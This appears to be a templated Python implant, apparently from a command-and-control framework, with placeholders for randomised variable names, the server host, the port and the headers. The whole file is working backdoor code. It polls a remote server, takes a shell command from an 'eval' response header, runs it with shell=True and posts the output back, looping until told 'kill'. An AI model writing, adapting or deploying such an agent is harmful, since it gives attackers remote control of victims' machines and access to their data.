import sys
import subprocess

from os import remove
from requests import post
from time import sleep
from urllib import parse

{{variables['errors'][0]}} = {{variables['errors'][1]}}
{{variables['host'][0]}} = "{{variables['host'][1]}}"
{{variables['port'][0]}} = "{{variables['port'][1]}}"
{{variables['sleep'][0]}} = {{variables['sleep'][1]}}
{{variables['useragent'][0]}} = "{{variables['useragent'][1]}}"
{{variables['content-type'][0]}} = "{{variables['content-type'][1]}}"
{{variables['x-frame-options'][0]}} = "{{variables['x-frame-options'][1]}}"

def checkin(data):
    try:
        headers = {'useragent':{{variables['useragent'][0]}},
                   'content-type':{{variables['content-type'][0]}},
                   'x-frame-options':{{variables['x-frame-options'][0]}},
                   'Connection-ID':"{{connection_id}}"
                  }
        if isinstance(data, str):
            headers.update({'mimetype':'text/plain'})
        else:
            headers.update({'mimetype':'application/octet-stream'})
        response = post("{{server_context}}://" + {{variables['host'][0]}} + ":" + {{variables['port'][0]}} + "{{checkin_uri}}",
             headers=headers,
             data=data
            )
        return response
    except:
        {{variables['errors'][0]}} += 1
        if {{variables['errors'][0]}} > 50:
            sys.exit(0)

def main(results = ''):
    try:
        while True:
            try:
                response = checkin(results)
                if results:
                    results = ''
                command = parse.unquote(response.headers['eval'])
                if 'kill' == command:
                    return
                try:
                    results = subprocess.check_output([command], stderr=subprocess.STDOUT, shell=True, encoding='UTF-8')
                    sleep({{variables['sleep'][0]}})
                except Exception as e:
                    results = f'Failed to run {command}: {e}'
            except:
                sleep({{variables['sleep'][0]}})
    except:
        return

if __name__ == '__main__':
    sys.exit(main())
